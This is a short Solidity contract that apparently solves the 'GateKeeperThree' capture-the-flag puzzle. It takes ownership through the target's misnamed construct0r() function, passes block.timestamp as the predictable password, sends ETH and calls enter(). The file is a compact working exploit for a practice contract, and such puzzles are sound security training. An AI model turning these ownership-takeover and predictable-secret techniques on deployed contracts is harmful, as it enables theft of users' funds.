// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "hardhat/console.sol";

interface IGateKeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

interface ITrick {
    //function checkPassword(uint256 _password) external returns (bool);
}

contract MyGateKeeperThreeAttack {
    constructor() {}

    function enter(address target) external payable {
        // target contract
        IGateKeeperThree keeper = IGateKeeperThree(target);

        // become target owner
        keeper.construct0r();

        // instantiate Trick contract
        keeper.createTrick();

        // get allowance, use block.timestamp as password
        // block.timestamp is same for both keeper and trick contracts
        keeper.getAllowance(block.timestamp);

        // send eth
        (bool res, ) = address(keeper).call{ value: msg.value }("");
        res;

        keeper.enter();
    }
}
